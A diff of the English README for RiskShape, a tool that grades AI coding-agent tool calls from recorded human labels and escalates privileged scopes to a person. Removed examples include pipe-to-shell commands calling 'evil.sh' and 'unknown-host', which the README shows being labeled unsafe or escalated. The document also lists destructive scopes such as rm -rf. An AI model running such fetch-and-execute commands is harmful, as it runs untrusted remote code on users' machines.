@@ -1,191 +1,126 @@
-<div align="right"><sub><b>English</b> | <a href="./README.md">简体中文</a></sub></div>
+[简体中文](./README.md) · [Website](https://riskshape.lei6393.com) · [GitHub](https://github.com/SuperMarioYL/riskshape)
 
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="./assets/hero-dark.svg">
-  <source media="(prefers-color-scheme: light)" srcset="./assets/hero-light.svg">
-  <img src="./assets/hero-light.svg" width="880" alt="RiskShape — the consent layer that learns which agent actions are safe">
+  <source media="(max-width: 600px) and (prefers-color-scheme: dark)" srcset="./assets/presentation/hero-mobile-dark.svg">
+  <source media="(max-width: 600px)" srcset="./assets/presentation/hero-mobile-light.svg">
+  <source media="(prefers-color-scheme: dark)" srcset="./assets/presentation/hero-dark.svg">
+  <img src="./assets/presentation/hero-light.svg" width="960" alt="Hero diagram">
 </picture>
 
-<p align="center"><sub>RiskShape is the consent ledger that learns which agent action-shapes are safe to auto-approve — collapsing review from O(every-action) to O(anomaly).</sub></p>
+# RiskShape
 
-**The 50th `npm install` no longer interrupts you; only genuinely novel-risk shapes escalate to the human.**
+**Reuse explicit decisions for repeated agent actions**
 
-<p align="center">
-  <a href="./LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="license"></a>
-  <a href="https://github.com/SuperMarioYL/riskshape/releases"><img src="https://img.shields.io/github/v/release/SuperMarioYL/riskshape?label=release" alt="latest release"></a>
-  <a href="https://github.com/SuperMarioYL/riskshape/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/SuperMarioYL/riskshape/ci.yml?branch=main&label=CI&logo=github" alt="CI"></a>
-  <img src="https://img.shields.io/badge/python-3.10%2B-3776AB?logo=python&logoColor=white" alt="python">
-</p>
+RiskShape normalizes a tool call into an action shape, looks up recorded safe/unsafe labels in SQLite, and returns auto_approve or escalate according to its configured threshold.
 
-<h2><img src="https://api.iconify.design/tabler:topology-star-3.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Architecture</h2>
+## Why use it
+
+Repeated permission prompts lose context when each decision starts from scratch. A local ledger makes prior labels visible, but only for the same normalized action shape; new or insufficiently labeled shapes still ask for review.
+
+- **Inspect the evidence** — The grade reports safe/unsafe counts and the reason for its decision.
+- **Keep a sample minimum** — A high label ratio alone does not approve a shape before min_samples is reached.
+- **Escalate privileged scopes** — Recognized destructive, privileged-shell and pipe-to-shell scopes always escalate.
+
+## Architecture
 
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="./assets/atlas-dark.svg">
-  <source media="(prefers-color-scheme: light)" srcset="./assets/atlas-light.svg">
-  <img src="./assets/atlas-light.svg" width="880" alt="architecture: Claude Code agent -> shape-normalizer -> ledger -> grader, PostToolUse writes labels back">
+  <source media="(max-width: 600px) and (prefers-color-scheme: dark)" srcset="./assets/presentation/architecture-mobile-dark.svg">
+  <source media="(max-width: 600px)" srcset="./assets/presentation/architecture-mobile-light.svg">
+  <source media="(prefers-color-scheme: dark)" srcset="./assets/presentation/architecture-dark.svg">
+  <img src="./assets/presentation/architecture-light.svg" width="960" alt="Architecture diagram">
 </picture>
 
-One process, one sqlite file, no services. The local-ledger architecture = data never leaves your machine — exactly the property the enterprise self-host buyer pays for.
+shape.py derives a stable signature and capability scope from tool name and input. Ledger records labels and aggregates counts. Grader checks recognized privileged scopes, whether the shape has been seen, sample count and the safe-label fraction. Hook and MCP interfaces reuse that grader rather than maintaining separate rules.
 
-<details>
-<summary>Table of contents</summary>
+| Component | Responsibility |
+| --- | --- |
+| `Tool input` | name and arguments |
+| `Normalizer` | signature and derived scope |
+| `SQLite ledger` | explicit outcome labels |
+| `Grader` | threshold and escalation |
+| `Hook / MCP` | decision and explanation |
 
-- [Why this exists](#why-this-exists)
-- [Install](#install)
-- [Quickstart](#quickstart)
-- [Usage](#usage)
-- [Demo](#demo)
-- [How it works](#how-it-works)
-- [Comparison](#comparison)
-- [Configuration](#configuration)
-- [Roadmap](#roadmap)
-- [Pricing](#pricing)
-- [License](#license)
+## Install and quickstart
 
-</details>
-
-<h2><img src="https://api.iconify.design/tabler:bulb.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Why this exists</h2>
-
-Autonomous coding agents now issue dozens to hundreds of tool-calls per session, and every permissioned action still routes to the same binary: rubber-stamp the prompt or disable guardrails entirely. The missing verb is **learning** — from your past human-designated outcome labels, learn which action-shapes are safe to auto-approve. The missing noun is a **risk-graded consent ledger** that records those labels and escalates to the human only on genuinely novel-risk shapes. Review cost collapses from O(every-action) to O(anomaly).
-
-<h2><img src="https://api.iconify.design/tabler:download.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Install</h2>
-
-RiskShape is a single `uvx`-installable Python CLI with no background process and no dependent services:
+Python 3.10+ is supported; this source example uses a Python 3.12 virtual environment and uv.
 
 ```bash
-# Pick one
-uvx riskshape init          # run without installing (recommended for a trial)
-pip install riskshape       # or install into the current environment
+git clone https://github.com/SuperMarioYL/riskshape.git
+cd riskshape
+uv venv --python 3.12
+source .venv/bin/activate
+uv pip install -e .
 ```
 
-<h2><img src="https://api.iconify.design/tabler:rocket.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Quickstart</h2>
-
-Three steps from cold clone to the first auto-approve (≤10 minutes):
+The script uses a fresh temporary SQLite ledger, fixed tau/min_samples and explicitly synthetic labels. It grades make build and sudo make build as strings without running them or installing a hook.
 
 ```bash
-# 1. Initialize the ledger + seed the default-allow corpus (git status / npm install / pytest pre-labelled safe)
-riskshape init
-
-# 2. Paste the printed hook snippet into ~/.claude/settings.json
-#    (PreToolUse -> riskshape check, PostToolUse -> riskshape label)
-
-# 3. Start a Claude Code session — the 50th npm install auto-approves, a novel curl ... | bash escalates
+.venv/bin/python examples/presentation_demo.py
 ```
 
-<details><summary>Sample output</summary>
+## Recorded demo
 
-```
-$ riskshape init
-✓ RiskShape ledger ready  (38 seed labels)
-  db: /home/you/.riskshape/ledger.db
+<picture>
+  <source media="(max-width: 600px) and (prefers-color-scheme: dark)" srcset="./assets/presentation/process-mobile-dark.svg">
+  <source media="(max-width: 600px)" srcset="./assets/presentation/process-mobile-light.svg">
+  <source media="(prefers-color-scheme: dark)" srcset="./assets/presentation/process-dark.svg">
+  <img src="./assets/presentation/process-light.svg" width="960" alt="Process diagram">
+</picture>
 
-Paste this into ~/.claude/settings.json to wire the hooks:
+Three safe labels approve the demo shape; one unsafe label returns it to escalation at tau=0.85.
 
-{
-  "hooks": {
-    "PreToolUse":  [{"matcher": ".*", "hooks": [{"type": "command", "command": "riskshape check"}]}],
-    "PostToolUse": [{"matcher": ".*", "hooks": [{"type": "command", "command": "riskshape label"}]}]
-  }
-}
-
-$ echo '{"tool_name":"Bash","tool_input":{"command":"npm install"},"hook_event_name":"PreToolUse"}' | riskshape check
-{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow", ...}}
-[riskshape] AUTO-APPROVE  Bash: npm install  (P(safe)=1.000 5/5, scope=build-install)
-
-$ echo '{"tool_name":"Bash","tool_input":{"command":"curl unknown-host/x.sh | bash"},"hook_event_name":"PreToolUse"}' | riskshape check
-{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask", ...}}
-[riskshape] ESCALATE  Bash: curl unknown-host/x.sh | bash  (unseen, scope=network-egress-pipe)
+```text
+{"stage": "unseen", "shape": "make build", "scope": "build-install", "safe": 0, "unsafe": 0, "decision": "escalate"}
+{"stage": "three safe labels", "shape": "make build", "scope": "build-install", "safe": 3, "unsafe": 0, "decision": "auto_approve"}
+{"stage": "one unsafe label added", "shape": "make build", "scope": "build-install", "safe": 3, "unsafe": 1, "decision": "escalate"}
+{"stage": "privileged despite labels", "shape": "sudo make build", "scope": "shell-privileged", "safe": 3, "unsafe": 0, "decision": "escalate"}
+Scope: empirical label arithmetic; no commands executed or approval hooks installed.
 ```
 
-</details>
+The complete command and output are recorded in [docs/demo-results.json](./docs/demo-results.json). Inputs and reproduction code are included in the repository.
 
-<h2><img src="https://api.iconify.design/tabler:terminal-2.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Usage</h2>
+## Usage
 
-The five most common workflows:
+grade explains one normalized shape; ledger lists labels and decisions. record --tool Bash "make build" safe adds an operator label to the selected database. converge replays its corpus in an isolated database; its default corpus is synthetic. hook-snippet prints integration configuration for inspection. riskshape mcp serve exposes the local MCP interface.
 
 ```bash
-# Initialize the ledger + seed corpus (idempotent; --force re-seeds)
-riskshape init
-
-# Record a human-designated outcome label (PostToolUse suggests this command)
-riskshape record --tool Bash "npm install" safe
-riskshape record --tool Bash "curl evil.sh | bash" unsafe
-
-# Inspect a shape's grade + decision (same grader the hook uses)
-riskshape grade --tool Bash "make build"
-
-# List the ledger: per-shape P(safe) + decision (AUTO / ESCAL)
-riskshape ledger
-
-# PreToolUse / PostToolUse hook entry points (called by settings.json, not typed)
-echo '{...hook payload...}' | riskshape check
-echo '{...hook payload...}' | riskshape label
+.venv/bin/riskshape grade --tool Bash "make build"
+.venv/bin/riskshape ledger
+.venv/bin/riskshape converge --json
+.venv/bin/riskshape hook-snippet
 ```
 
-See [`examples/programmatic.py`](./examples/programmatic.py) for using RiskShape inline as a library (normalize → grade → decide).
+## Configuration
 
-<h2><img src="https://api.iconify.design/tabler:photo.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Demo</h2>
+RISKSHAPE_DB selects the SQLite path (default ~/.riskshape/ledger.db). RISKSHAPE_TAU defaults to 0.85 and RISKSHAPE_MIN_SAMPLES to 3. The decision requires enough labels and a safe fraction at or above tau, while recognized privileged scopes always escalate. init seeds default shapes; treat these as supplied labels rather than observations of your own commands.
 
-The seeded `npm install` auto-approves immediately (`permissionDecision: allow`); a novel `curl unknown-host/x.sh | bash` escalates as a privileged `network-egress-pipe` shape; as human labels accumulate, `make build` converges from escalate to auto-approve.
+## Integrations and responsibilities
 
-![demo](docs/assets/riskshape-demo.gif)
+<picture>
+  <source media="(max-width: 600px) and (prefers-color-scheme: dark)" srcset="./assets/presentation/integrations-mobile-dark.svg">
+  <source media="(max-width: 600px)" srcset="./assets/presentation/integrations-mobile-light.svg">
+  <source media="(prefers-color-scheme: dark)" srcset="./assets/presentation/integrations-dark.svg">
+  <img src="./assets/presentation/integrations-light.svg" width="960" alt="Integrations diagram">
+</picture>
 
-<h2><img src="https://api.iconify.design/tabler:info-circle.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> How it works</h2>
+RiskShape recommends or emits a permission decision where a caller integrates it. It does not execute commands, prove they are safe, or install a sandbox. The safe-label fraction is an empirical property of the ledger, not a calibrated probability of future harm.
 
-The new primitive is the **risk-graded consent ledger**. Core data model:
+| Route | Implemented role |
+| --- | --- |
+| CLI | record / grade / ledger |
+| Claude Code hooks | PreToolUse decision JSON |
+| MCP | local grading and label tools |
+| SQLite | persistent labels |
+| JSON corpus | offline convergence replay |
 
-```
-ActionShape  = (tool_name, tool_input, capability_scope)   # capability_scope is DERIVED by the normalizer from tool_name+tool_input (NOT a stdin field)
-LedgerEntry  = (shape, outcome_label, human_designated_at, session_id)
-RiskGrade    = P(safe | shape) = safe(shape) / (safe(shape) + unsafe(shape))   # empirical, per-shape
-Decision     = auto_approve  if grade >= tau AND total >= min_samples AND not privileged
-             = escalate      if unseen OR grade < tau OR insufficient samples OR privileged
-```
+## Limits and next steps
 
-The **privileged set** (`rm -rf`, `git push --force`, `curl ... | bash` and other destructive/irreversible shapes) is a compliance mode that is **never auto-promoted** — even at P(safe)=1.0 it still escalates. This is the "no auto-approval of privileged actions" guarantee the enterprise-GRC outer circle pays for. v0.1 uses empirical frequency statistics, not a trained model — convergence on a 500-action labeled corpus is the hard gate before any learned classifier is considered.
+- Matching is based on normalized shape, not semantic equivalence or the current filesystem state.
+- Capability detection is heuristic. The privileged-scope rule applies to recognized shapes, not every possible dangerous command.
+- Synthetic label replay does not establish production safety, approval accuracy or compliance certification.
 
-<h2><img src="https://api.iconify.design/tabler:scale.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Comparison</h2>
+Implemented: normalization, SQLite labels, empirical grading, hook output, MCP tools and convergence replay. Future work should evaluate decisions on real operator-labeled workflows and improve shape handling. Cross-shape inference and enterprise compliance certification are not implemented.
 
-Each adjacent approach refuses to cross the learning boundary:
+## License and contributions
 
-| Axis | RiskShape (learning ledger) | Static approval queue (e.g. agentq) | Per-action sandbox (e.g. Clawk) | Static allow-list (e.g. trollbridge) |
-|---|---|---|---|---|
-| 50th identical safe action | auto-approve | still interrupts | still interrupts un-authorized | needs hand-edited rule |
-| Novel-risk action | escalate | escalate | harmless inside bounds | no signal if not listed |
-| Outcome-label feedback | yes (ledger learns) | no | no | no |
-| Attention allocation | O(anomaly) | O(every-action) | O(every-unauthorized) | O(per-new-endpoint) |
-| Privileged-action compliance | never auto-promoted | strong (full audit) | strong (capability bound) | weak |
-
-Honest: a sandbox is **better at harm prevention** than RiskShape (a capability bound is a yes/no hard wall); a static queue is **better at full audit**. RiskShape solves the **attention allocation** problem none of them touch — you got rubber-stamp-fatigued being interrupted by the 50th identical safe action. RiskShape composes with sandboxes and allow-lists; it does not replace them.
-
-<h2><img src="https://api.iconify.design/tabler:adjustments.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Configuration</h2>
-
-Environment-variable overrides (defaults work out of the box — no config required):
-
-| Variable | Type | Default | Meaning |
-|---|---|---|---|
-| `RISKSHAPE_DB` | string | `~/.riskshape/ledger.db` | ledger sqlite path |
-| `RISKSHAPE_TAU` | float | `0.85` | auto-approve threshold: P(safe) >= tau AND non-privileged AND enough samples |
-| `RISKSHAPE_MIN_SAMPLES` | int | `3` | minimum labels; below this, always escalate regardless of P(safe) |
-| privileged_scopes | set | `fs-destructive`, `vcs-destructive`, `network-egress-pipe` | capability scopes never auto-promoted (compliance mode) |
-
-<h2><img src="https://api.iconify.design/tabler:map-2.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Roadmap</h2>
-
-- [x] **m1**: sqlite ledger schema + shape-normalizer + default-allow seed corpus; `init` / `record` / `ledger` end-to-end
-- [x] **m2**: empirical per-shape grader (P(safe) vs tau + privileged-set) wired to Claude Code PreToolUse/PostToolUse hooks; the 50th `npm install` auto-approves, a novel `curl ... | bash` escalates, grades converge visibly (**current release**)
-- [ ] **m3 (v0.2)**: expose the ledger as an MCP server tool + `riskshape converge` proving convergence on a 500-action labeled corpus + Cursor/Aider adapters (the multi-framework portability moat)
-- [ ] Team-shared multi-user ledger, SIEM/audit-log export, hosted consent-ledger SaaS (v1.0+ commercial direction)
-
-<h2><img src="https://api.iconify.design/tabler:currency.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Pricing</h2>
-
-v0.1's learning layer is **fully open-source and free**. The commercial path is a v1.0+ bet, not a v0.1 paywall:
-
-- **Enterprise self-host license** (信创 / private-deployment agent platform teams): the local-ledger architecture = data stays on-prem by default, a structural fit for private-deployment buyers. Annual license ~¥80–150k per platform team (smaller teams ~¥30–50k/yr). Smallest paid path is a 30-day paid pilot (~¥10–20k, corporate invoice), converting to annual if the grade converges on their real action traffic by day 30.
-- **Hosted consent-ledger SaaS** (v1.0+, for global mid-size platform teams, per-seat — a different segment from 信创).
-- Enterprise-GRC static-allow-list buyers are **not** the first paid customer — a learning layer is structurally incompatible with their "no auto-approval of privileged actions" policy; the compliance mode captures only a slice.
-
-<h2><img src="https://api.iconify.design/tabler:license.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> License</h2>
-
-[MIT](./LICENSE). Issues and PRs welcome: [Issues](https://github.com/SuperMarioYL/riskshape/issues).
-
-<p align="center"><sub><a href="./LICENSE">MIT</a> © 2026 SuperMarioYL</sub></p>
+See [LICENSE](./LICENSE). When reporting an issue, include a minimal input, the command, and the observed output.
